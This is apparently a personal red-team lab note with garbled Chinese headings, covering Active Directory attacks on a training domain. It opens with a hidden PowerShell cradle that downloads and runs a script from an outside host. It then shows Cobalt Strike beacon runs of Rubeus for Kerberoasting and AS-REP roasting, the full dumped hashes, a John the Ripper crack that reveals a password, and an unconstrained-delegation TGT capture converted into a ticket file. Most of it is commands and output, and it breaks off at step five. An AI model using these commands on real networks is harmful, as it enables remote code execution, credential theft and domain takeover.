powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"

powershell.exe -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"

# Kerberoasting

æžšä¸¾åŸŸä¸­æ‰€æœ‰SPN

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /simple /nowrap
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660177644996.png)


```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /simple /nowrap
[*] Tasked beacon to run .NET program: Rubeus.exe kerberoast /simple /nowrap
[+] host called home, sent: 585311 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : dev.cyberbotic.io
[*] Searching path 'LDAP://dc-2.dev.cyberbotic.io/DC=dev,DC=cyberbotic,DC=io' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[+] received output:

[*] Total kerberoastable users : 2


[+] received output:
$krb5tgs$23$*svc_mssql$dev.cyberbotic.io$MSSQLSvc/srv-1.dev.cyberbotic.io:1433@dev.cyberbotic.io*$7795F2A1A18820C454802E5F59CAE5B9$066D8750AA3E8112A731C65CD2DE54263AF799C742F9F98BBF09B127D49ED99D858F45B1BADE67D98BF147A8B993AA467D0D1766CDD8B3AA82F71DD9B2A922B957F8F13A86705E772123B9D582E8C3CEA16FF17339D307790B50C32B74291D80D098A55C65CFDDC71747878DEEEABFDCF43523F82909E47C6B6E39039D8517BEBC7FBBC09EA39621DC2CD85A5DA7E4DE1215C92FECBF469D25E5718EEFE99D59C95BF048BB9FD72DD6A003F471CABA24EE645246F0EC55F60E3BD5A012392F77479765BB4D4DD21CDB581AED9002F82E61FD8ABCBD7426AB4C3331424642378EBDCF47ACB9FCD67235801C4AB61DCA4C033BD5AB9181C069BF1A8369894630E404474D767AABA01634B1D05F2C6AC5B7B8ECCFA43A91B445A663C0E6922E12F0A5097FD099A10244C5A0C7CE1C12391494E8D5F6333B6F6B67FE70C825019A1AB3082DD3E5DAF1FA3B1AF2EB68F227D34FB2123F1439487E6C8D13C17C552E4D441DABF9C38330786AD8325A483C2FE3F8FC2525CE47D108483C6881F2E2B94C6907429B0519671720B1189EDB9FC6E5862D72EC8DF4E3B2FE105B46D8C3D9F6A912D0E84F3632C86DD6A92B002CB66877EC4BE49A6C66507AA435CB85085A8CA87B1FFF0CF68371C0F546F5EC5D149399DF4BADB32ED6AD39361039433E01A204D4EBF292DEC2E1A0A56872CD87EFF4CB251F629420A6766D1296B9AC96E7C6BEBB8DDC9C6A25D7EA58A20929B8DCAA05E4F1B3159AF40316816062FAE89BCA1BB35E67B3193F95C234ED833A0B210370BABA8AF168F9C8639A23547D7D4D4B771DA017C3D4A55C54DE3C6F78A776040C09987C5274F70B7C6C59A6F77B3BF886130FE8EE756B110722C0B8670B51AC63F3C8CED91A3C8D746C0D6E250D1A654FBB0DAD5DDA1BD91F49C01E56D9310BE2EF393375268F5C6A5FF784933DBEEAAE5706C4271E0263CB70043CC455E6E228722713F22B1EEF00F85AD1087120A73CEEB0A56027B9CD449D789C1DDDB16922078F555EBCAA7EBBF00BFD1AE10BDA159A5A1BB5F7545A5527C8E26B9BFB958E7269358F74F54E8FE3A6812FE1E14F8D27E4696ED6ACBD435C191D038F53BB3B19469E8B10A65F0A94F636E2F126977EFFE6C1BB3E530ADB26C18EA5B01178A68D389DD356423D58EF0A341F0FC8881508EE804DAA098CB48063D0E3EA40D4F5014912E97346F3D1953480A2454FEC1B5AAA639E96A740401F76ABC4F6897BC811B161A93D338C75EEE084BC0295B5553D833C7AD261105FC54857FC397D6256020B1A22EB05749C238E9D82873B561ABBBEDAC405CBD4692B87D5763BF5228C0A6467579C5CBD61E876C08215C23DB66FAC5DED425722816AAEC29CE272C840DA1694851AF0B7F983D97E078DFE2D702CAABCE164786FC6399CF54AFD5FCE476379FE68253F746D94475647E83E222D79873C539AC8AC981C78A18AA4B4CBAB0121DF93EE0008640E96116B166F6CB6EE2CE088142275D78A91400B5DB0E32A2E529AFBE55ACAD0CD495963CDE933179D0BD1EE1B2A2D03724D799A3676366DBC3A7B943EF359AC67CE8DABC0CA86ACA600AE386D0A6D74DB1D28B7416D484EF96C67C35E61761043FC5B447BCBA543FFD3844296E7D2
$krb5tgs$23$*svc_honey$dev.cyberbotic.io$HoneySvc/fake.dev.cyberbotic.io@dev.cyberbotic.io*$20928CE9F86A3DEDC4BDB3174F2796EE$3267EF9F928009FA766A03C47E6726D37E84842EE296606CEB171580516AE455BBF56DDDEC218AD80BA1835304728EA2E49B39604357AF047FE2E8676DE383BDA28EB6E9AC06208F6CF1D836243641E984EED18B9EA9E727057F9AEBABC66A776D2D7B457C9B42E356B1C8E019AF3FBFAF616BB9E0F97ECF3342AE64AF9EDB36CEAAA54939C1C1AF477B40E1B9CDD10698E54B3F30045C09E7AE0320D8510C67FB5D933833DE974919C6EE84919E65C41033B8665B08646506BBEDA0FE221DAD71DAA877693BDC33A0C9445C5727DCE532B74767BD186B363A85BA856808DE63BDF3BA2C4FE8F43802DDD40610C0E1D739217FBE9F7B7C768AA11DC01DE9C8B87F7583D504FE5D1696D3CB4106782E0F208373245D5C63F2C151C70DD062E4098DB4A802F40FD008245AC97E79146569E36D4A0E3C3DC9F8A35D29E6551E3A074A57C9E6111B6FDED72CBF93D4C684E78A34B9ED4004EE0653AD093B648E9B4807A12C7B137E178C95152B8FFEB1CB3A87157242A236963F2129AC4D3F885F2F6DB3DB8AA120358E9088878C28016E04722FDFE303979E1AD9C9FCA5B399181A7BA70E370043D0286BE5C0326143C2FD9C090B3A8CB212CA15A352885D9BD6DE0E52CBE4BC81D55837F79D0CD043CD342912C98F5D27A4A4F6A2B7CB2B9541A19F19BF735A76E35154960C28257888AB9A40F15788394E2DC390102EF47EEDB23ADF520321480B2686BDF98E73A83DD0C531E850BD12F9C73E2FAFEA0518678EFE47D2B8E1A51CFDD848DB3A0006802F58BE2EEBB44177469C0C48278090E3A6B69EAF8E552248663DE48F3C9211B9E3EEDCAF86075ECE3DCA7C7BA1D73F311FAE488311082BE76C546538B4DFC0F877184A52A36448CFC45E1866ECEADEDA2AEB921BC0AFDD7C6C93E00FCAF9FDFBA008FAB0747D385D6328D76A67FAD4B5581E693301D6197E6CB6BC2DB84283CBBACF6F0B852732CB46B6069F54622ACB3B141AD058723A8DFB38303561E72C6C560A910804B1E76DA84E03BD8D13F3FF50D646936D897371257B1692D0D3BBF2D4B4C20D9A6D8D19983C0D7DCEB3E36D34F4AB75A9AEB4844D419F61DEBCFC4035BCFDA8518DACE7717E735ECF2DFE5F2FB35BD5D42890EDD050EC8C0F0767F652D6FEE11350DC8910B9174306026AC88C8DAD5FA2659B344578AFB82E5E0223203048C521D80434BE5677A49F0F2799CAB1E9D98A343F01D804F042A36BA49F6352C826DFB0B81CAEB83CBE4B505FDFD127D059010A3D68062BCF2E4B3D2FB2300E780CD1E78D5CB566D7B507C39CE1190E871CFCC786A46133BC401D6A56E913604F4100DAF29711370211D06C125B0C3C48BEB1884612D5B9DA8C486EEC1C578E7C290E8AB99DAC2A8A703DBD43E7674DA9DA4B0D68507DC08E8A3FC7C3B3FB50EE6246E4A66237DB854D0683D4515AF53DAE7BACF262780AE8B2630063D235AC1EBB3F5FB08738E9C6CD35FC86A43D00DDC025E593EDCB1BB4DB5E25F0B53BC3DEB028DB9C14BB6FC02E0F497D072CFD3BF152CFD295771DDBB8F1F753FF56FFD21A72E7D58B197C9C647CDC49167B05DE0F459A9428AC1E631D559CC606BF8F6C6B30F518E5CD66A42C46DC411ABE81C59E06CF3D88BB
```

ç‰¹å®šç”¨æˆ·çš„spnï¼Œè¿™é‡Œé€‰æ‹©svc_mysql

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660177751965.png)

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /user:svc_mssql /nowrap
[*] Tasked beacon to run .NET program: Rubeus.exe kerberoast /user:svc_mssql /nowrap
[+] host called home, sent: 585327 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 


[*] Action: Kerberoasting


[+] received output:
[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : svc_mssql
[*] Target Domain          : dev.cyberbotic.io
[*] Searching path 'LDAP://dc-2.dev.cyberbotic.io/DC=dev,DC=cyberbotic,DC=io' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=svc_mssql)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[+] received output:

[*] Total kerberoastable users : 1


[*] SamAccountName         : svc_mssql
[*] DistinguishedName      : CN=MS SQL Service,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] ServicePrincipalName   : MSSQLSvc/srv-1.dev.cyberbotic.io:1433
[*] PwdLastSet             : 5/14/2021 1:28:34 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_mssql$dev.cyberbotic.io$MSSQLSvc/srv-1.dev.cyberbotic.io:1433@dev.cyberbotic.io*$7795F2A1A18820C454802E5F59CAE5B9$066D8750AA3E8112A731C65CD2DE54263AF799C742F9F98BBF09B127D49ED99D858F45B1BADE67D98BF147A8B993AA467D0D1766CDD8B3AA82F71DD9B2A922B957F8F13A86705E772123B9D582E8C3CEA16FF17339D307790B50C32B74291D80D098A55C65CFDDC71747878DEEEABFDCF43523F82909E47C6B6E39039D8517BEBC7FBBC09EA39621DC2CD85A5DA7E4DE1215C92FECBF469D25E5718EEFE99D59C95BF048BB9FD72DD6A003F471CABA24EE645246F0EC55F60E3BD5A012392F77479765BB4D4DD21CDB581AED9002F82E61FD8ABCBD7426AB4C3331424642378EBDCF47ACB9FCD67235801C4AB61DCA4C033BD5AB9181C069BF1A8369894630E404474D767AABA01634B1D05F2C6AC5B7B8ECCFA43A91B445A663C0E6922E12F0A5097FD099A10244C5A0C7CE1C12391494E8D5F6333B6F6B67FE70C825019A1AB3082DD3E5DAF1FA3B1AF2EB68F227D34FB2123F1439487E6C8D13C17C552E4D441DABF9C38330786AD8325A483C2FE3F8FC2525CE47D108483C6881F2E2B94C6907429B0519671720B1189EDB9FC6E5862D72EC8DF4E3B2FE105B46D8C3D9F6A912D0E84F3632C86DD6A92B002CB66877EC4BE49A6C66507AA435CB85085A8CA87B1FFF0CF68371C0F546F5EC5D149399DF4BADB32ED6AD39361039433E01A204D4EBF292DEC2E1A0A56872CD87EFF4CB251F629420A6766D1296B9AC96E7C6BEBB8DDC9C6A25D7EA58A20929B8DCAA05E4F1B3159AF40316816062FAE89BCA1BB35E67B3193F95C234ED833A0B210370BABA8AF168F9C8639A23547D7D4D4B771DA017C3D4A55C54DE3C6F78A776040C09987C5274F70B7C6C59A6F77B3BF886130FE8EE756B110722C0B8670B51AC63F3C8CED91A3C8D746C0D6E250D1A654FBB0DAD5DDA1BD91F49C01E56D9310BE2EF393375268F5C6A5FF784933DBEEAAE5706C4271E0263CB70043CC455E6E228722713F22B1EEF00F85AD1087120A73CEEB0A56027B9CD449D789C1DDDB16922078F555EBCAA7EBBF00BFD1AE10BDA159A5A1BB5F7545A5527C8E26B9BFB958E7269358F74F54E8FE3A6812FE1E14F8D27E4696ED6ACBD435C191D038F53BB3B19469E8B10A65F0A94F636E2F126977EFFE6C1BB3E530ADB26C18EA5B01178A68D389DD356423D58EF0A341F0FC8881508EE804DAA098CB48063D0E3EA40D4F5014912E97346F3D1953480A2454FEC1B5AAA639E96A740401F76ABC4F6897BC811B161A93D338C75EEE084BC0295B5553D833C7AD261105FC54857FC397D6256020B1A22EB05749C238E9D82873B561ABBBEDAC405CBD4692B87D5763BF5228C0A6467579C5CBD61E876C08215C23DB66FAC5DED425722816AAEC29CE272C840DA1694851AF0B7F983D97E078DFE2D702CAABCE164786FC6399CF54AFD5FCE476379FE68253F746D94475647E83E222D79873C539AC8AC981C78A18AA4B4CBAB0121DF93EE0008640E96116B166F6CB6EE2CE088142275D78A91400B5DB0E32A2E529AFBE55ACAD0CD495963CDE933179D0BD1EE1B2A2D03724D799A3676366DBC3A7B943EF359AC67CE8DABC0CA86ACA600AE386D0A6D74DB1D28B7416D484EF96C67C35E61761043FC5B447BCBA543FFD3844296E7D2


```

ä¸Šé¢æ ¼å¼è½¬æˆ
```
$krb5tgs$23$*svc_mssql$dev.cyberbotic.io*$7795F2A1A18820C454802E5F59CAE5B9$066D8750AA3E8112A731C65CD2DE54263AF799C742F9F98BBF09B127D49ED99D858F45B1BADE67D98BF147A8B993AA467D0D1766CDD8B3AA82F71DD9B2A922B957F8F13A86705E772123B9D582E8C3CEA16FF17339D307790B50C32B74291D80D098A55C65CFDDC71747878DEEEABFDCF43523F82909E47C6B6E39039D8517BEBC7FBBC09EA39621DC2CD85A5DA7E4DE1215C92FECBF469D25E5718EEFE99D59C95BF048BB9FD72DD6A003F471CABA24EE645246F0EC55F60E3BD5A012392F77479765BB4D4DD21CDB581AED9002F82E61FD8ABCBD7426AB4C3331424642378EBDCF47ACB9FCD67235801C4AB61DCA4C033BD5AB9181C069BF1A8369894630E404474D767AABA01634B1D05F2C6AC5B7B8ECCFA43A91B445A663C0E6922E12F0A5097FD099A10244C5A0C7CE1C12391494E8D5F6333B6F6B67FE70C825019A1AB3082DD3E5DAF1FA3B1AF2EB68F227D34FB2123F1439487E6C8D13C17C552E4D441DABF9C38330786AD8325A483C2FE3F8FC2525CE47D108483C6881F2E2B94C6907429B0519671720B1189EDB9FC6E5862D72EC8DF4E3B2FE105B46D8C3D9F6A912D0E84F3632C86DD6A92B002CB66877EC4BE49A6C66507AA435CB85085A8CA87B1FFF0CF68371C0F546F5EC5D149399DF4BADB32ED6AD39361039433E01A204D4EBF292DEC2E1A0A56872CD87EFF4CB251F629420A6766D1296B9AC96E7C6BEBB8DDC9C6A25D7EA58A20929B8DCAA05E4F1B3159AF40316816062FAE89BCA1BB35E67B3193F95C234ED833A0B210370BABA8AF168F9C8639A23547D7D4D4B771DA017C3D4A55C54DE3C6F78A776040C09987C5274F70B7C6C59A6F77B3BF886130FE8EE756B110722C0B8670B51AC63F3C8CED91A3C8D746C0D6E250D1A654FBB0DAD5DDA1BD91F49C01E56D9310BE2EF393375268F5C6A5FF784933DBEEAAE5706C4271E0263CB70043CC455E6E228722713F22B1EEF00F85AD1087120A73CEEB0A56027B9CD449D789C1DDDB16922078F555EBCAA7EBBF00BFD1AE10BDA159A5A1BB5F7545A5527C8E26B9BFB958E7269358F74F54E8FE3A6812FE1E14F8D27E4696ED6ACBD435C191D038F53BB3B19469E8B10A65F0A94F636E2F126977EFFE6C1BB3E530ADB26C18EA5B01178A68D389DD356423D58EF0A341F0FC8881508EE804DAA098CB48063D0E3EA40D4F5014912E97346F3D1953480A2454FEC1B5AAA639E96A740401F76ABC4F6897BC811B161A93D338C75EEE084BC0295B5553D833C7AD261105FC54857FC397D6256020B1A22EB05749C238E9D82873B561ABBBEDAC405CBD4692B87D5763BF5228C0A6467579C5CBD61E876C08215C23DB66FAC5DED425722816AAEC29CE272C840DA1694851AF0B7F983D97E078DFE2D702CAABCE164786FC6399CF54AFD5FCE476379FE68253F746D94475647E83E222D79873C539AC8AC981C78A18AA4B4CBAB0121DF93EE0008640E96116B166F6CB6EE2CE088142275D78A91400B5DB0E32A2E529AFBE55ACAD0CD495963CDE933179D0BD1EE1B2A2D03724D799A3676366DBC3A7B943EF359AC67CE8DABC0CA86ACA600AE386D0A6D74DB1D28B7416D484EF96C67C35E61761043FC5B447BCBA543FFD3844296E7D2
```



# AS-REP Roasting

æžšä¸¾å…³é—­äº†kerberosé¢„è®¤è¯çš„ç”¨æˆ·

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660178346391.jpg)

æžšä¸¾ä¸Šé¢ç”¨æˆ·çš„å“ˆå¸Œ

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660178409310.png)

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asreproast /user:svc_oracle /nowrap
[*] Tasked beacon to run .NET program: Rubeus.exe asreproast /user:svc_oracle /nowrap
[+] host called home, sent: 585329 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 


[*] Action: AS-REP roasting

[*] Target User            : svc_oracle
[*] Target Domain          : dev.cyberbotic.io

[*] Searching path 'LDAP://dc-2.dev.cyberbotic.io/DC=dev,DC=cyberbotic,DC=io' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=svc_oracle))'
[*] SamAccountName         : svc_oracle
[*] DistinguishedName      : CN=Oracle Service,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Building AS-REQ (w/o preauth) for: 'dev.cyberbotic.io\svc_oracle'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$svc_oracle@dev.cyberbotic.io:5125359739A99E22EC26ADD5B60287CE$1ECD74195BC35CAC5224A3BD84879CED340BBF22E7309F02E7DC9EA7BCFC4FDD4419E511BFAFB3FC8FC397605B0CA193CB0D235FE3407A99D4E5DB2ECD08CA7A51CB63EFAAC700776A1B89BEF6A2DFAD6E6CC1A83C4C3EF8BB87EC5CB26BDE1C1792D0F96BCE8BF18258386379B8C475995255F32384FEC81B09C75F09F2504B7C04D8C5FF28DFEEC28D397BF15B9A6D91348012B37918CBCC20CC4B04C273D4F0D63BC21CF6ACDC4AD24C40B016325A760BDF1483614567F5EED768B745B1C9145A87CEDF374F8B38B6D704F61B84990BB0A51F1CF4EF6F8AFE652760A1FB943247710B6B740A8132920EAA42A94828F86434A3BBFB


```

æ•´ç†æˆä¸€è¡Œ
```
$krb5asrep$svc_oracle@dev.cyberbotic.io:5125359739A99E22EC26ADD5B60287CE$1ECD74195BC35CAC5224A3BD84879CED340BBF22E7309F02E7DC9EA7BCFC4FDD4419E511BFAFB3FC8FC397605B0CA193CB0D235FE3407A99D4E5DB2ECD08CA7A51CB63EFAAC700776A1B89BEF6A2DFAD6E6CC1A83C4C3EF8BB87EC5CB26BDE1C1792D0F96BCE8BF18258386379B8C475995255F32384FEC81B09C75F09F2504B7C04D8C5FF28DFEEC28D397BF15B9A6D91348012B37918CBCC20CC4B04C273D4F0D63BC21CF6ACDC4AD24C40B016325A760BDF1483614567F5EED768B745B1C9145A87CEDF374F8B38B6D704F61B84990BB0A51F1CF4EF6F8AFE652760A1FB943247710B6B740A8132920EAA42A94828F86434A3BBFB
```

ç”¨johnç ´è§£
```
â”Œâ”€â”€(rootðŸ’€kali)-[~/crto]
â””â”€# john  svc_oracle --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Passw0rd!        ($krb5asrep$svc_oracle@dev.cyberbotic.io)     
1g 0:00:00:00 DONE (2022-08-11 00:00) 2.127g/s 598059p/s 598059c/s 598059C/s SANANDREAS..March30
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```


# æ— çº¦æŸå§”æ´¾

æžšä¸¾æ— çº¦æŸå§”æ´¾çš„æœºå™¨

```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660178578300.png)


DCé»˜è®¤æ˜¯æ— çº¦æŸå§”æ´¾çš„æœºå™¨ï¼Œé‡ç‚¹å…³æ³¨SRV-1$

1. å‡è®¾å·²ç»æ”»ç ´SRV-1$è¿™å°æœºå™¨ï¼Œåœ¨SRV-1$ä¸Šå¼€å¯ç›‘å¬ï¼š

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser:nlamb /interval:10
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660179325582.png)


2. æ¥åˆ°WKSTN-2ï¼Œä»¥nlambçš„èº«ä»½æ‰§è¡Œ```dir \\srv-1\c$```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660179399723.png)

3. æ”¶åˆ°nlambçš„ç¥¨æ®å“ˆå¸Œ


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660179478426.png)


```
[+] received output:

[*] 8/11/2022 12:56:40 AM UTC - Found new TGT:

  User                  :  nlamb@DEV.CYBERBOTIC.IO
  StartTime             :  8/11/2022 12:56:35 AM
  EndTime               :  8/11/2022 10:56:35 AM
  RenewTill             :  1/1/1970 12:00:00 AM
  Flags                 :  name_canonicalize, pre_authent, forwarded, forwardable
  Base64EncodedTicket   :

    doIFZzCCBWOgAwIBBaEDAgEWooIEYDCCBFxhggRYMIIEVKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsG
    a3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBA4wggQKoAMCARKhAwIBAqKCA/wEggP4I+aflzp17pqiJHYT0JvaIHyDcHcGZYIO
    nFlOkkUydDuRhAyepxh1aMadlIxZdtpj6vxgzcjN/qsMOZuCz+QmrWdVRTVoXH/e+XeiyOBTyLFMgMbI7uWx2/OveVs2ym0bHQEQ
    DxBcJDeN+vSi56o71wDBIBeljX2Hw6j6I6URkp9LJNK2VkozNk39oFFrbvT2bRInORkdOtPC35eoY9/wY+3snYkqOJQ2IXgk2Ppt
    WZ42pvzM7+yqeXRq2VNAYJDp2TBLWcgRcTghG0xIqQBOkDv/qO7NACib8++wtjpBpVW5YPNuKTpIAF011NCQRRDHWoNvspIp6Z8e
    fNMgix6JJhHWezM/cpVuu9lNLXl1miVqstcY6gmpCvqLMPaopjkSni7subR3IXuB/jsa5eNt0b3CvXjZ/Y0KqfR+BXvADW1XDv2e
    EZqFl6CLCnDvElaKhY9CIlkv6RYb4TGxcpxHTdQPVncd1Y+ILOZDWaG+kXv/PBHIe+fOD8hK3l4o+Jk62HbvO98jB9TUZtTeH7jX
    SdixzymsyW5QTPpZ6+JfvEn6MVDLeSn8oOGre0bPm8NezQpyHjCv57fTaeIBxwJ/XAtn/i0MzXxD/3Vvajsr3kuWCRIPCII+L47s
    FbbjZt0LkAGizakNZY9sDCmlzOngB4VKiLXwbjJXyotiafyFzLpdiCgyXMG8qV8H1g2PQ8nXMVDAHpTa1fctY8NP8Tlzmit4z4Mh
    dCn7XS0UvUp6qdm8hJxE0NU+NIF4G4xQ1yENjvXzFqs5NCKLJCo8WyFYCX5rQdfBZq3JpCQb8e5eh5oKgkxiJ5Rra4wAZm483DgA
    Iq28ATQj3xttCON+iwGaG1Tf8y6WGGHBqXYhwPM7+1Ls/CCxUiZTpEYWQX8jcT+DPF6Ji8EfASLYRT/xmf/F+x21RsV1k7oAWcbd
    atrp9TIUSGANhYj0kJ6YUuWC+yfLi3OILoWUQVxL8BYSLLR2zAakr64hfUtuXD82qzvWLabA0oYzA8FuyyhBIjY1sCqis5rfeJ4s
    V2fCP/6iBFbMmZqfiazt7Vx6K2DUd3I8r5yJQCb4tnby4DevoHXp+xnczIYv4Pf4M72voWm08ocYDIedkBtnWlrZlw3/ZG7Z1NGz
    UZVLFdXL5u4V/gVbgtyp9ZuDuVBBzYgLJ1zdMBWnbXJi+VEG9g2nOWD2ySZSRloshQsUvIv17vQlaWqSe3OB7DNy+X9dotKf85xs
    Gwg1hFALWMTpyyUIeslOJTXhCdL0npdtBhCJffzQ7S3F4agYC4L0W0lJly21Ec+kR8HL4JpPhDboaS4Ry6F65eGT+OWiuyB7YF1M
    SbJ6FAJ7EX2EpqgwZPdL4TSjgfIwge+gAwIBAKKB5wSB5H2B4TCB3qCB2zCB2DCB1aArMCmgAwIBEqEiBCD8y3kIIE1V18wD3aQd
    rhINPU/88IwqEpSTqFuYlI+ea6ETGxFERVYuQ1lCRVJCT1RJQy5JT6ISMBCgAwIBAaEJMAcbBW5sYW1iowcDBQBgIQAApREYDzIw
    MjIwODExMDA1NjM1WqYRGA8yMDIyMDgxMTEwNTYzNVqnERgPMTk3MDAxMDEwMDAwMDBaqBMbEURFVi5DWUJFUkJPVElDLklPqSYw
    JKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JTw==

```


ç”¨powershellæ ¹æ®tgtåˆ¶ä½œticket
```
[IO.File]::WriteAllBytes("C:\Users\bfmarer\Desktop\ticket.kirbi", [Convert]::FromBase64String("doIFZzCCBWOgAwIBBaEDAgEWooIEYDCCBFxhggRYMIIEVKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBA4wggQKoAMCARKhAwIBAqKCA/wEggP4I+aflzp17pqiJHYT0JvaIHyDcHcGZYIOnFlOkkUydDuRhAyepxh1aMadlIxZdtpj6vxgzcjN/qsMOZuCz+QmrWdVRTVoXH/e+XeiyOBTyLFMgMbI7uWx2/OveVs2ym0bHQEQDxBcJDeN+vSi56o71wDBIBeljX2Hw6j6I6URkp9LJNK2VkozNk39oFFrbvT2bRInORkdOtPC35eoY9/wY+3snYkqOJQ2IXgk2PptWZ42pvzM7+yqeXRq2VNAYJDp2TBLWcgRcTghG0xIqQBOkDv/qO7NACib8++wtjpBpVW5YPNuKTpIAF011NCQRRDHWoNvspIp6Z8efNMgix6JJhHWezM/cpVuu9lNLXl1miVqstcY6gmpCvqLMPaopjkSni7subR3IXuB/jsa5eNt0b3CvXjZ/Y0KqfR+BXvADW1XDv2eEZqFl6CLCnDvElaKhY9CIlkv6RYb4TGxcpxHTdQPVncd1Y+ILOZDWaG+kXv/PBHIe+fOD8hK3l4o+Jk62HbvO98jB9TUZtTeH7jXSdixzymsyW5QTPpZ6+JfvEn6MVDLeSn8oOGre0bPm8NezQpyHjCv57fTaeIBxwJ/XAtn/i0MzXxD/3Vvajsr3kuWCRIPCII+L47sFbbjZt0LkAGizakNZY9sDCmlzOngB4VKiLXwbjJXyotiafyFzLpdiCgyXMG8qV8H1g2PQ8nXMVDAHpTa1fctY8NP8Tlzmit4z4MhdCn7XS0UvUp6qdm8hJxE0NU+NIF4G4xQ1yENjvXzFqs5NCKLJCo8WyFYCX5rQdfBZq3JpCQb8e5eh5oKgkxiJ5Rra4wAZm483DgAIq28ATQj3xttCON+iwGaG1Tf8y6WGGHBqXYhwPM7+1Ls/CCxUiZTpEYWQX8jcT+DPF6Ji8EfASLYRT/xmf/F+x21RsV1k7oAWcbdatrp9TIUSGANhYj0kJ6YUuWC+yfLi3OILoWUQVxL8BYSLLR2zAakr64hfUtuXD82qzvWLabA0oYzA8FuyyhBIjY1sCqis5rfeJ4sV2fCP/6iBFbMmZqfiazt7Vx6K2DUd3I8r5yJQCb4tnby4DevoHXp+xnczIYv4Pf4M72voWm08ocYDIedkBtnWlrZlw3/ZG7Z1NGzUZVLFdXL5u4V/gVbgtyp9ZuDuVBBzYgLJ1zdMBWnbXJi+VEG9g2nOWD2ySZSRloshQsUvIv17vQlaWqSe3OB7DNy+X9dotKf85xsGwg1hFALWMTpyyUIeslOJTXhCdL0npdtBhCJffzQ7S3F4agYC4L0W0lJly21Ec+kR8HL4JpPhDboaS4Ry6F65eGT+OWiuyB7YF1MSbJ6FAJ7EX2EpqgwZPdL4TSjgfIwge+gAwIBAKKB5wSB5H2B4TCB3qCB2zCB2DCB1aArMCmgAwIBEqEiBCD8y3kIIE1V18wD3aQdrhINPU/88IwqEpSTqFuYlI+ea6ETGxFERVYuQ1lCRVJCT1RJQy5JT6ISMBCgAwIBAaEJMAcbBW5sYW1iowcDBQBgIQAApREYDzIwMjIwODExMDA1NjM1WqYRGA8yMDIyMDgxMTEwNTYzNVqnERgPMTk3MDAxMDEwMDAwMDBaqBMbEURFVi5DWUJFUkJPVElDLklPqSYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JTw=="))
```



4. åœæ­¢æ•èŽ·

```
beacon> jobs
[*] Tasked beacon to list jobs
[+] host called home, sent: 8 bytes
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 1    4400  .NET assembly

beacon> jobkill 1
[*] Tasked beacon to kill job 1
[+] host called home, sent: 10 bytes
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660179755965.png)

5. 